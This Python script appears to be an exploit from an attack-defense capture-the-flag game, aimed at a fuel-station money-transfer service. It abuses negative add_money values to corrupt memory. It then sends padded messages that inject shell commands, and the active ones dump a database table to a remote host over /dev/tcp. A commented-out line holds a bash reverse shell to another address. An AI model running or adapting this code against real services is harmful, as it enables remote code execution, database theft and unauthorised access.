#!/usr/bin/env python3
import json
import random
import string
import sys

import requests

URL = f'http://{sys.argv[1]}:8087'

def register(u: str, p: str):
    r = requests.post(URL+'/api/register', json={'username':u,'password':p})
    return r.text

def login(u: str, p: str):
    r = requests.post(URL+'/api/login', json={'username':u,'password':p})
    return r.text

def send(uid: str, balance: int, fr: int, to: int, msg: str):
    r = requests.post(URL+'/api/send', json={'uid':uid,'receiver_id':uid,'msg':msg,'money':balance,'from':fr,'to':to})
    return r.text

def add_money(uid: str, amount: int, station_id: int, oil_id: int):
    r = requests.post(URL+"/api/add_money", json.dumps({"type":"ADD_MONEY","uid":uid,"amount":amount,"station_id":station_id,"oil_id":oil_id}))
    return r.text


u = ''.join([random.choice(string.ascii_letters) for _ in range(10)])
uid = json.loads(register(u, u))['id']

fr = 16007
to = 16018

# send(uid, balance=1, fr=fr, to=to, msg='aaaaaaa')
# add_money(uid, amount=-10000, oil_id=0, station_id=to)
# for i in range(1000):
#     print(i)
#     send(uid, balance=1, fr=fr, to=to, msg='aaaaaaa')

# add_money(uid, amount=-0x38ceb0, oil_id=-0x39, station_id=to)

add_money(uid, amount=-0x38af00, oil_id=-0x5b, station_id=to)

# send(uid, balance=1, fr=fr, to=to, msg='echo \'bash -i >& /dev/tcp/172.20.0.1/1234 0>&1\' > /tmp/s'.ljust(0x40, ' '))
# send(uid, balance=1, fr=fr, to=to, msg='bash /tmp/s &'.ljust(0x40, ' '))

send(uid, balance=1, fr=fr, to=to, msg='echo \'export DEBIAN_FRONTEND=noninteractive\napt update\napt install -y postgresql\nPGPASSWORD=app psql -U app -d app -h db -c "select message from oil where time > 0" > /dev/tcp/172.22.0.1/1234\' > /tmp/s'.ljust(0x40, ' '))
send(uid, balance=1, fr=fr, to=to, msg='bash /tmp/s &'.ljust(0x40, ' '))

add_money(uid, amount=0, oil_id=0xfffff, station_id=to)
